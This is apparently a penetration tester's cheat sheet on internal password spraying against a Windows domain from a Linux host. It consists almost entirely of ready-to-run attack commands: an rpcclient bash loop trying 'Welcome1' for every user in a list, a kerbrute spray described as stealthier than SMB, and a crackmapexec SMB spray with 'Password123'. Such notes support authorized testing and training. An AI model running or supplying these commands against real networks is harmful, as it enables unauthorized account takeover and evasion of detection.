
## <span style="color:#8BE9FD">Internal Password Spraying from a Linux Host</span>

> [!info] Variables used below
> - `$VICTIM_IP` – target machine's IP
> - `$DC_IP` – Domain Controller's IP
> - `$DOMAIN` – target domain name

### <span style="color:#50FA7B">Using a Bash one-liner for the Attack</span>

```bash
# Tries password "Welcome1" against all users in users.txt
# "Authority" in response = successful login
for u in $(cat users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" $VICTIM_IP | grep Authority; done
```

This command will try to authenticate to the domain controller with each username in the users.txt file and the password `Welcome1`. If the authentication is successful (which is indicated by the keyword `Authority` in the respond), the user's username will be returned.

### <span style="color:#50FA7B">KERBRUTE PASSWORD SPRAY</span>
```bash
# Password spray using Kerberos (stealthier than SMB)
kerbrute passwordspray -d $DOMAIN --dc $DC_IP users.txt Welcome1
```


### <span style="color:#50FA7B">CRACKMAPEXEC PASSWORD SPRAY</span>
```bash
# Tries Password123 against all users, shows only successful (+)
crackmapexec smb $VICTIM_IP -u users.txt -p Password123 | grep +
```